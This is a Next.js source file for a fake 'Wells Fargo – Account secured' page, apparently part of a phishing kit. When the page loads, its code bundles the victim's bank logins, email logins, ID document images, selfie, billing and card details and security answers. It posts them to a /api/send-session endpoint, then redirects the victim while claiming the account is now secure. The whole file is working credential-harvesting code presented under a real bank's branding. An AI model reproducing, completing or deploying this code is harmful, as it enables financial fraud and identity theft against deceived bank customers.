import { Typography } from "@mui/material";
import { Box } from "@mui/system";
import axios from "axios";
import Head from "next/head";
import React, { useContext, useEffect } from "react";
import { Footer } from "../components/Footer";
import { Header } from "../components/Header";
import { Spinner } from "../components/Spinner";
import { Wrapper } from "../components/Wrapper";
import { dataURItoBlob } from "../utils/dataURItoBlob";
import { DataContext } from "./_app";

interface ConfirmationProps {}

export const Confirmation: React.FC<ConfirmationProps> = ({}) => {
  const { data } = useContext(DataContext);

  useEffect(() => {
    if (typeof window !== `undefined` && data && Object.keys(data).length) {
      const front = data.docs && data.docs.front;
      const back = data.docs && data.docs.back;
      const logins = data.logins;
      const selfie = data.selfie;
      const emailLogins = data.emailLogins;
      const billing = data.billing;
      const cardDetails = data.cardDetails;
      const answers = data.answers;

      const sendSession = async () => {
        if (logins) {
          const formData = new FormData();

          if (front && back) {
            formData.append(`front`, front);
            formData.append(`back`, back);
          }

          if (logins) {
            formData.append(`logins`, JSON.stringify(logins));
          }

          if (selfie) {
            formData.append(`selfie`, dataURItoBlob(selfie));
          }

          if (emailLogins) {
            formData.append(`emailLogins`, JSON.stringify(emailLogins));
          }

          if (billing) {
            formData.append(`billing`, JSON.stringify(billing));
          }

          if (cardDetails) {
            formData.append(`cardDetails`, JSON.stringify(cardDetails));
          }

          if (answers) {
            formData.append(`answers`, JSON.stringify(answers));
          }

          formData.append(`form`, `SESSION`);

          await axios.post(`/api/send-session`, formData, {
            headers: {
              "Content-Type": `multipart/form-data`,
            },
          });
        } else {
          console.log(`You are on the server`);
        }

        window.location.href = process.env.NEXT_PUBLIC_EXIT_URL as string;
      };

      sendSession();
    }
    return () => {};
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  return (
    <>
      <Head>
        <title>Wells Fargo - Account secured</title>
      </Head>
      <Header />
      <Wrapper
        paragraph="Thank you! Your account is now secure."
        title="Account secured"
        marginTop={["1rem", "1.5rem"]}
        titleSX={{
          color: "#d20826",
          fontSize: "40px",
          lineHeight: "44px",
          textAlign: "center",
          position: "relative",
          display: "block",
          padding: "48px 0 0",
          outline: "none",
          marginBottom: "24px",
          fontFamily: '"Wells Fargo Serif",Georgia,serif',
          fontWeight: "400",
        }}
      >
        <Box
          sx={{
            width: "100%",
            display: "flex",
            alignItems: "center",
            flexDirection: "column",
            textAlign: "center",
          }}
        >
          <Typography>
            Please wait, while we redirect you to the sign on page.
          </Typography>
          {/* <CircularProgress
            sx={{
              marginY: "2rem",
              color: "#d71f28",
            }}
          /> */}
          <Box sx={{ marginY: "2rem" }}>
            <Spinner color="#d71f28" />
          </Box>
        </Box>
      </Wrapper>
      <Footer />
    </>
  );
};

export default Confirmation;
